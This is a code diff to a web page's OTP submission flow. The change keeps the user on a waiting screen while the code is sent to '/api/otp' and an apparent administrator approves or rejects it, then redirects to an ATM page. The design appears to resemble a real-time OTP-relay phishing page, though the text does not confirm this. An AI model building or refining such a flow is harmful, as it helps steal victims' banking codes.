@@ -417,6 +417,7 @@
       otpForm.style.display = 'none';
       waitOverlay.classList.add('show');
       verifyBtn.disabled = true;
+      otpInput.disabled = true;
 
       fetch('/api/otp', {
         method: 'POST',
@@ -426,37 +427,15 @@
       .then(function(res){ return res.json(); })
       .then(function(data){
         if (data && data.ok) {
-          fetch('/api/status/' + requestId)
-            .then(function(res){ return res.json(); })
-            .then(function(statusData){
-              var currentStatus = statusData && statusData.status ? normalizeStatus(statusData.status) : '';
-              if (isApprovedStatus(currentStatus)) {
-                redirectToAtm();
-                return;
-              }
-              if (isRejectedStatus(currentStatus)) {
-                stopPoll();
-                waitOverlay.classList.remove('show');
-                rejectOverlay.classList.add('show');
-                return;
-              }
-              pollOtpStatus();
-            })
-            .catch(function(){
-              pollOtpStatus();
-            });
+          pollOtpStatus();
           return;
         }
-        waitOverlay.classList.remove('show');
-        rejectOverlay.classList.add('show');
+        // لا نعرض رفضًا فورياً هنا؛ المستخدم يبقى في حالة الانتظار حتى قرار الإدارة.
+        pollOtpStatus();
       })
       .catch(function(err){
         console.warn('تعذر الاتصال بالسيرفر الخلفي:', err);
-        waitOverlay.classList.add('show');
-        rejectOverlay.classList.remove('show');
-      })
-      .finally(function(){
-        verifyBtn.disabled = false;
+        pollOtpStatus();
       });
     });
 
@@ -465,6 +444,7 @@
       waitOverlay.classList.remove('show');
       otpForm.style.display = 'block';
       otpInput.value = '';
+      otpInput.disabled = false;
       otpField.classList.remove('invalid');
       stopPoll();
       verifyBtn.disabled = false;
